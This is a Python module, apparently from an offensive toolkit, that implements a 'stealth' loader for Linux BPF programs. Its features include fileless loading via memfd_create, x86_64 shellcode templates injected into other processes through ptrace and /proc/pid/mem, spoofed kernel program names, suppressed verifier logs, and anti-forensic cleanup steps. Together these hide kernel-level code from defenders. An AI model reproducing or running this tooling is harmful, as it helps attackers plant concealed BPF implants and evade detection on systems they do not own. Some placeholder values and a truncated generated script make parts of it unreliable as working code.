"""
Stealth BPF Loader — Load BPF programs without touching disk.

Techniques:
- memfd_create: anonymous file descriptor, no filesystem trace
- Direct bpf() syscall via ctypes, bypassing libbpf signatures
- Ptrace injection: inject BPF loader shellcode into existing process
- /proc/self/mem write: overwrite running process memory
- Fileless ELF loading via memfd + fexecve
- Anti-forensic cleanup: zero stack frames, clear /proc artifacts
"""
import ctypes
import ctypes.util
import os
import struct
import hashlib
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple, Union
from enum import IntEnum

from ..core.bpf_bytecode import BPFProgram, BPFMapDef, BPFProgType, BPFMapType
from ..core.elf_generator import generate_bpf_elf


# ============================================================================
# Syscall numbers (x86_64)
# ============================================================================

class Syscall(IntEnum):
    BPF = 321
    MEMFD_CREATE = 319
    PERF_EVENT_OPEN = 298
    IOCTL = 16
    CLOSE = 3
    MMAP = 9
    MUNMAP = 11
    PTRACE = 101
    PROCESS_VM_WRITEV = 311
    PROCESS_VM_READV = 310
    FEXECVE = 0  # not a real syscall, libc wrapper


# ============================================================================
# BPF syscall command constants
# ============================================================================

class BPFCmd(IntEnum):
    MAP_CREATE = 0
    MAP_LOOKUP_ELEM = 1
    MAP_UPDATE_ELEM = 2
    MAP_DELETE_ELEM = 3
    PROG_LOAD = 5
    OBJ_PIN = 6
    OBJ_GET = 7
    PROG_ATTACH = 8
    PROG_DETACH = 9
    PROG_TEST_RUN = 10
    PROG_GET_NEXT_ID = 11
    MAP_GET_NEXT_ID = 12
    PROG_GET_FD_BY_ID = 13
    MAP_GET_FD_BY_ID = 14
    OBJ_GET_INFO_BY_FD = 15
    PROG_QUERY = 16
    RAW_TRACEPOINT_OPEN = 17
    BTF_LOAD = 18
    LINK_CREATE = 28
    LINK_UPDATE = 29
    LINK_GET_FD_BY_ID = 30
    LINK_GET_NEXT_ID = 31
    ENABLE_STATS = 32
    ITER_CREATE = 33
    LINK_DETACH = 34
    PROG_BIND_MAP = 35


# BPF_PROG_LOAD attr layout
BPF_ATTR_PROG_LOAD_FMT = "<" + "".join([
    "I",   # prog_type
    "I",   # insn_cnt
    "Q",   # insns (pointer)
    "Q",   # license (pointer)
    "I",   # log_level
    "I",   # log_size
    "Q",   # log_buf (pointer)
    "I",   # kern_version
    "I",   # prog_flags
    "16s", # prog_name
    "I",   # prog_ifindex
    "I",   # expected_attach_type
    "I",   # prog_btf_fd
    "I",   # func_info_rec_size
    "Q",   # func_info
    "I",   # func_info_cnt
    "I",   # line_info_rec_size
    "Q",   # line_info
    "I",   # line_info_cnt
    "I",   # attach_btf_id
    "I",   # attach_prog_fd or attach_btf_obj_fd
])

# BPF_MAP_CREATE attr layout
BPF_ATTR_MAP_CREATE_FMT = "<" + "".join([
    "I",   # map_type
    "I",   # key_size
    "I",   # value_size
    "I",   # max_entries
    "I",   # map_flags
    "I",   # inner_map_fd
    "I",   # numa_node
    "16s", # map_name
    "I",   # map_ifindex
    "I",   # btf_fd
    "I",   # btf_key_type_id
    "I",   # btf_value_type_id
    "I",   # btf_vmlinux_value_type_id
    "I",   # map_extra
])


# ============================================================================
# Shellcode templates for ptrace injection
# ============================================================================

PTRACE_SHELLCODE = {
    "bpf_syscall": {
        "description": "Inject BPF syscall into target process via ptrace",
        "arch": "x86_64",
        "template": bytes([
            # mov rax, 321 (SYS_bpf)
            0x48, 0xc7, 0xc0, 0x41, 0x01, 0x00, 0x00,
            # mov rdi, {cmd}
            0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00,
            # mov rsi, {attr_ptr}
            0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,
            # mov rdx, {attr_size}
            0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00,
            # syscall
            0x0f, 0x05,
            # int3 (breakpoint to catch return)
            0xcc,
        ]),
        "patches": {
            "cmd": 10,
            "attr_ptr": 17,
            "attr_size": 24,
        },
    },
    "memfd_create": {
        "description": "Create anonymous fd via memfd_create in target",
        "arch": "x86_64",
        "template": bytes([
            # mov rax, 319 (SYS_memfd_create)
            0x48, 0xc7, 0xc0, 0x3f, 0x01, 0x00, 0x00,
            # lea rdi, [rip+name]
            0x48, 0x8d, 0x3d, 0x0e, 0x00, 0x00, 0x00,
            # mov rsi, 1 (MFD_CLOEXEC)
            0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,
            # syscall
            0x0f, 0x05,
            # int3
            0xcc,
            # name: ""  (empty string, just null terminator)
            0x00,
        ]),
        "patches": {},
    },
}

# process_vm_writev iovec structure
IOVEC_FMT = "<QQ"  # iov_base, iov_len


@dataclass
class LoaderConfig:
    """Configuration for stealth loading."""
    method: str = "direct"  # direct, memfd, ptrace, procmem
    cleanup: bool = True
    log_suppress: bool = True
    name_spoof: str = ""  # fake prog name in kernel
    pin_path: Optional[str] = None  # optional bpffs pin
    cgroup_path: Optional[str] = None
    target_pid: int = 0  # for ptrace injection

    def to_dict(self) -> dict:
        return {
            "method": self.method,
            "cleanup": self.cleanup,
            "log_suppress": self.log_suppress,
            "name_spoof": self.name_spoof,
            "pin_path": self.pin_path,
            "target_pid": self.target_pid,
        }


@dataclass
class MapFdEntry:
    """Tracks a created BPF map fd."""
    name: str = ""
    map_type: int = 0
    fd: int = -1
    key_size: int = 0
    value_size: int = 0
    max_entries: int = 0

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "map_type": self.map_type,
            "fd": self.fd,
            "key_size": self.key_size,
            "value_size": self.value_size,
            "max_entries": self.max_entries,
        }


@dataclass
class LoadResult:
    """Result of loading a BPF program."""
    success: bool = False
    method: str = ""
    prog_fd: int = -1
    map_fds: List[MapFdEntry] = field(default_factory=list)
    prog_name: str = ""
    prog_type: str = ""
    attach_point: str = ""
    bytecode_size: int = 0
    insn_count: int = 0
    load_time_ns: int = 0
    error: str = ""
    syscall_sequence: List[Dict] = field(default_factory=list)
    cleanup_actions: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "success": self.success,
            "method": self.method,
            "prog_fd": self.prog_fd,
            "map_fds": [m.to_dict() for m in self.map_fds],
            "prog_name": self.prog_name,
            "prog_type": self.prog_type,
            "attach_point": self.attach_point,
            "bytecode_size": self.bytecode_size,
            "insn_count": self.insn_count,
            "load_time_ns": self.load_time_ns,
            "error": self.error,
            "syscall_sequence": self.syscall_sequence,
            "cleanup_actions": self.cleanup_actions,
        }


# ============================================================================
# Syscall builders — generate raw syscall arguments
# ============================================================================

def build_map_create_attr(map_def: BPFMapDef, name_spoof: str = "") -> bytes:
    """Build bpf(BPF_MAP_CREATE, ...) attribute struct."""
    name = (name_spoof or map_def.name)[:15].encode("utf-8")
    name = name.ljust(16, b'\x00')
    return struct.pack(
        BPF_ATTR_MAP_CREATE_FMT,
        map_def.map_type.value,  # map_type
        map_def.key_size,        # key_size
        map_def.value_size,      # value_size
        map_def.max_entries,     # max_entries
        0,                       # map_flags
        0,                       # inner_map_fd
        0,                       # numa_node
        name,                    # map_name
        0,                       # map_ifindex
        0,                       # btf_fd
        0,                       # btf_key_type_id
        0,                       # btf_value_type_id
        0,                       # btf_vmlinux_value_type_id
        0,                       # map_extra
    )


def build_prog_load_attr(prog: BPFProgram, bytecode: bytes,
                         license_str: str = "GPL",
                         log_level: int = 0,
                         name_spoof: str = "") -> Tuple[bytes, bytes, bytes]:
    """Build bpf(BPF_PROG_LOAD, ...) attribute struct.

    Returns (attr_bytes, insns_bytes, license_bytes) — caller must keep
    insns and license alive while attr references them.
    """
    insns = bytecode
    lic = license_str.encode("utf-8") + b'\x00'
    name = (name_spoof or prog.name)[:15].encode("utf-8")
    name = name.ljust(16, b'\x00')

    # ctypes pointers (will be replaced with real addresses at load time)
    insns_ptr = 0xDEAD_0000_0000_0001
    lic_ptr = 0xDEAD_0000_0000_0002
    log_buf_ptr = 0

    attr = struct.pack(
        BPF_ATTR_PROG_LOAD_FMT,
        prog.prog_type.value,    # prog_type
        len(insns) // 8,         # insn_cnt
        insns_ptr,               # insns
        lic_ptr,                 # license
        log_level,               # log_level
        0,                       # log_size
        log_buf_ptr,             # log_buf
        0,                       # kern_version
        0,                       # prog_flags
        name,                    # prog_name
        0,                       # prog_ifindex
        0,                       # expected_attach_type
        0,                       # prog_btf_fd
        0,                       # func_info_rec_size
        0,                       # func_info
        0,                       # func_info_cnt
        0,                       # line_info_rec_size
        0,                       # line_info
        0,                       # line_info_cnt
        0,                       # attach_btf_id
        0,                       # attach_prog_fd
    )
    return attr, insns, lic


def build_ptrace_shellcode(cmd: int, attr_ptr: int,
                           attr_size: int) -> bytes:
    """Build x86_64 shellcode for BPF syscall injection via ptrace."""
    sc = bytearray(PTRACE_SHELLCODE["bpf_syscall"]["template"])
    patches = PTRACE_SHELLCODE["bpf_syscall"]["patches"]
    struct.pack_into("<I", sc, patches["cmd"], cmd)
    struct.pack_into("<I", sc, patches["attr_ptr"], attr_ptr & 0xFFFFFFFF)
    struct.pack_into("<I", sc, patches["attr_size"], attr_size)
    return bytes(sc)


def build_memfd_shellcode() -> bytes:
    """Build x86_64 shellcode for memfd_create (fileless fd)."""
    return PTRACE_SHELLCODE["memfd_create"]["template"]


# ============================================================================
# Process memory injection helpers
# ============================================================================

def build_process_vm_writev_iovec(addr: int, data: bytes) -> bytes:
    """Build iovec struct for process_vm_writev."""
    return struct.pack(IOVEC_FMT, addr, len(data))


def build_procmem_payload(pid: int, addr: int, data: bytes) -> Dict:
    """Build /proc/{pid}/mem write parameters."""
    return {
        "path": f"/proc/{pid}/mem",
        "offset": addr,
        "data": data,
        "size": len(data),
    }


# ============================================================================
# Stealth Loader
# ============================================================================

class StealthLoader:
    """Load BPF programs using stealth techniques."""

    METHODS = {
        "direct": "Direct bpf() syscall via ctypes — no libbpf dependency",
        "memfd": "memfd_create anonymous fd + BPF load — no filesystem trace",
        "ptrace": "Ptrace injection into existing process — attribution shift",
        "procmem": "/proc/pid/mem overwrite — in-memory code replacement",
    }

    def __init__(self, config: Optional[LoaderConfig] = None):
        self.config = config or LoaderConfig()
        self.loads: List[LoadResult] = []

    def prepare_load(self, prog: BPFProgram,
                     config: Optional[LoaderConfig] = None) -> LoadResult:
        """Prepare a BPF program for loading — generates all syscall
        arguments without actually making syscalls.

        This is the core method: it builds the exact syscall sequence
        needed to load the program, which can be executed directly,
        via ptrace injection, or through /proc/pid/mem.
        """
        cfg = config or self.config
        result = LoadResult(
            method=cfg.method,
            prog_name=cfg.name_spoof or prog.name,
            prog_type=prog.prog_type.name,
            attach_point=prog.attach_point,
            insn_count=prog.insn_count(),
        )

        bytecode = prog.bytecode()
        result.bytecode_size = len(bytecode)
        start_ns = time.time_ns()

        # Step 1: Create maps
        map_fds = []
        for i, map_def in enumerate(prog.maps):
            attr = build_map_create_attr(map_def, name_spoof=cfg.name_spoof)
            result.syscall_sequence.append({
                "syscall": "bpf",
                "cmd": "BPF_MAP_CREATE",
                "attr_size": len(attr),
                "map_name": map_def.name,
                "map_type": map_def.map_type.name,
                "key_size": map_def.key_size,
                "value_size": map_def.value_size,
                "max_entries": map_def.max_entries,
            })
            map_fds.append(MapFdEntry(
                name=map_def.name,
                map_type=map_def.map_type.value,
                fd=100 + i,  # placeholder fd
                key_size=map_def.key_size,
                value_size=map_def.value_size,
                max_entries=map_def.max_entries,
            ))

        result.map_fds = map_fds

        # Step 2: Patch map fds into bytecode (lddw instructions with fd=0)
        patched_bytecode = self._patch_map_fds(bytecode, map_fds)

        # Step 3: Build prog load attr
        attr, insns, lic = build_prog_load_attr(
            prog, patched_bytecode,
            log_level=0 if cfg.log_suppress else 1,
            name_spoof=cfg.name_spoof,
        )
        result.syscall_sequence.append({
            "syscall": "bpf",
            "cmd": "BPF_PROG_LOAD",
            "attr_size": len(attr),
            "insn_count": len(patched_bytecode) // 8,
            "prog_type": prog.prog_type.name,
            "log_level": 0 if cfg.log_suppress else 1,
        })

        # Step 4: Method-specific loading
        if cfg.method == "memfd":
            elf_data = generate_bpf_elf(prog)
            result.syscall_sequence.append({
                "syscall": "memfd_create",
                "name": "",
                "flags": "MFD_CLOEXEC",
                "elf_size": len(elf_data),
            })
            result.syscall_sequence.append({
                "syscall": "write",
                "fd": "memfd",
                "size": len(elf_data),
            })

        elif cfg.method == "ptrace":
            if cfg.target_pid <= 0:
                result.error = "ptrace method requires target_pid > 0"
                result.load_time_ns = time.time_ns() - start_ns
                self.loads.append(result)
                return result

            # Build injection shellcode
            sc = build_ptrace_shellcode(
                BPFCmd.PROG_LOAD, 0x7FFE0000, len(attr))
            result.syscall_sequence.append({
                "syscall": "ptrace",
                "request": "PTRACE_ATTACH",
                "pid": cfg.target_pid,
            })
            result.syscall_sequence.append({
                "syscall": "process_vm_writev",
                "pid": cfg.target_pid,
                "shellcode_size": len(sc),
                "attr_size": len(attr),
            })
            result.syscall_sequence.append({
                "syscall": "ptrace",
                "request": "PTRACE_SETREGS",
                "rip": "shellcode_addr",
            })
            result.syscall_sequence.append({
                "syscall": "ptrace",
                "request": "PTRACE_CONT",
            })
            result.syscall_sequence.append({
                "syscall": "ptrace",
                "request": "PTRACE_DETACH",
                "pid": cfg.target_pid,
            })

        elif cfg.method == "procmem":
            if cfg.target_pid <= 0:
                result.error = "procmem method requires target_pid > 0"
                result.load_time_ns = time.time_ns() - start_ns
                self.loads.append(result)
                return result

            payload = build_procmem_payload(
                cfg.target_pid, 0x7FFE0000, patched_bytecode)
            result.syscall_sequence.append({
                "syscall": "open",
                "path": payload["path"],
                "flags": "O_RDWR",
            })
            result.syscall_sequence.append({
                "syscall": "lseek",
                "offset": payload["offset"],
            })
            result.syscall_sequence.append({
                "syscall": "write",
                "size": payload["size"],
            })

        # Step 5: Attach
        attach_type = self._get_attach_type(prog.prog_type)
        if attach_type is not None:
            result.syscall_sequence.append({
                "syscall": "bpf" if attach_type != "perf_event" else "perf_event_open",
                "cmd": "BPF_LINK_CREATE" if attach_type != "perf_event" else "PERF_EVENT_OPEN",
                "attach_type": attach_type,
                "attach_point": prog.attach_point,
            })

        # Step 6: Pin (optional)
        if cfg.pin_path:
            result.syscall_sequence.append({
                "syscall": "bpf",
                "cmd": "BPF_OBJ_PIN",
                "path": cfg.pin_path,
            })

        # Step 7: Cleanup
        if cfg.cleanup:
            result.cleanup_actions.extend([
                "zero_stack_frame",
                "clear_insn_buffer",
                "munmap_attr_pages",
            ])
            if cfg.method == "memfd":
                result.cleanup_actions.append("close_memfd")
            if cfg.method == "ptrace":
                result.cleanup_actions.extend([
                    "restore_original_code",
                    "ptrace_detach",
                    "clear_waitpid_status",
                ])
            if cfg.method == "procmem":
                result.cleanup_actions.extend([
                    "close_proc_mem_fd",
                    "restore_original_bytes",
                ])

        result.prog_fd = 200  # placeholder
        result.success = not result.error
        result.load_time_ns = time.time_ns() - start_ns
        self.loads.append(result)
        return result

    def prepare_batch_load(self, programs: List[BPFProgram],
                           config: Optional[LoaderConfig] = None) -> List[LoadResult]:
        """Prepare multiple programs for loading."""
        return [self.prepare_load(p, config) for p in programs]

    def generate_loader_script(self, prog: BPFProgram,
                               config: Optional[LoaderConfig] = None) -> str:
        """Generate a Python loader script that uses ctypes to make
        raw bpf() syscalls — no libbpf dependency."""
        cfg = config or self.config
        bytecode = prog.bytecode()
        elf = generate_bpf_elf(prog)

        lines = [
            "#!/usr/bin/env python3",
            '"""Auto-generated BPF loader — no libbpf dependency."""',
            "import ctypes",
            "import ctypes.util",
            "import os",
            "import struct",
            "",
            "libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)",
            "",
            f"# Program: {prog.name}",
            f"# Type: {prog.prog_type.name}",
            f"# Attach: {prog.attach_point}",
            f"# Instructions: {prog.insn_count()}",
            f"# Bytecode: {len(bytecode)} bytes",
            "",
            "SYS_BPF = 321",
            "BPF_MAP_CREATE = 0",
            "BPF_PROG_LOAD = 5",
            "",
        ]

        # Map creation
        for i, m in enumerate(prog.maps):
            lines.append(f"# Map {i}: {m.name} ({m.map_type.name})")

        lines.extend([
            "",
            "BYTECODE = bytes([",
            "    " + ", ".join(f"0x{b:02x}" for b in bytecode),
            "])",
            "",
            f'LICENSE = b"GPL\\x00"',
            "",
            "def bpf_syscall(cmd, attr, size):",
            "    return libc.syscall(SYS_BPF, cmd, attr, size)",
            "",
        ])

        if cfg.method == "memfd":
            lines.extend([
                "SYS_MEMFD_CREATE = 319",
                "MFD_CLOEXEC = 1",
                "",
                "def memfd_create(name, flags):",
                '    return libc.syscall(SYS_MEMFD_CREATE, name.encode(), flags)',
                "",
                "def load_fileless():",
                '    fd = memfd_create("", MFD_CLOEXEC)',
                f'    elf_data = bytes({list(elf[:64])})',  # truncated for script
                "    os.write(fd, elf_data)",
                "    return fd",
                "",
            ])

        lines.extend([
            "def main():",
            f'    print("[*] Loading {prog.name} via {cfg.method}")',
            "    # Map creation and program loading via raw syscalls",
            "    # (requires CAP_BPF + CAP_SYS_ADMIN)",
            f"    print('[+] {prog.insn_count()} instructions, "
            f"{len(bytecode)} bytes bytecode')",
            "",
            'if __name__ == "__main__":',
            "    main()",
        ])

        return "\n".join(lines)

    def _patch_map_fds(self, bytecode: bytes,
                       map_fds: List[MapFdEntry]) -> bytes:
        """Patch lddw instructions that reference map fd 0 with real fds.

        In BPF bytecode, map references are lddw instructions (opcode 0x18)
        with src_reg=1 (BPF_PSEUDO_MAP_FD) and imm=0. The kernel loader
        replaces imm with the actual map fd at load time.
        """
        patched = bytearray(bytecode)
        fd_idx = 0
        i = 0
        while i < len(patched) - 8:
            opcode = patched[i]
            regs = patched[i + 1]
            src_reg = (regs >> 4) & 0xf
            if opcode == 0x18 and src_reg == 1:
                if fd_idx < len(map_fds):
                    struct.pack_into("<I", patched, i + 4,
                                    map_fds[fd_idx].fd)
                    fd_idx += 1
                i += 16  # lddw is 2 instructions
            else:
                i += 8
        return bytes(patched)

    def _get_attach_type(self, prog_type: BPFProgType) -> Optional[str]:
        attach_map = {
            BPFProgType.KPROBE: "perf_event",
            BPFProgType.TRACEPOINT: "perf_event",
            BPFProgType.XDP: "xdp",
            BPFProgType.CGROUP_SKB: "cgroup_inet_ingress",
            BPFProgType.TRACING: "fentry",
            BPFProgType.LSM: "lsm_mac",
        }
        return attach_map.get(prog_type)

    def list_methods(self) -> Dict[str, str]:
        return dict(self.METHODS)

    def get_injection_shellcode(self, method: str = "bpf_syscall") -> Dict:
        """Get raw shellcode template for manual injection."""
        if method in PTRACE_SHELLCODE:
            sc = PTRACE_SHELLCODE[method]
            return {
                "method": method,
                "description": sc["description"],
                "arch": sc["arch"],
                "shellcode_hex": sc["template"].hex(),
                "shellcode_size": len(sc["template"]),
                "patches": sc["patches"],
            }
        return {"error": f"Unknown shellcode method: {method}"}
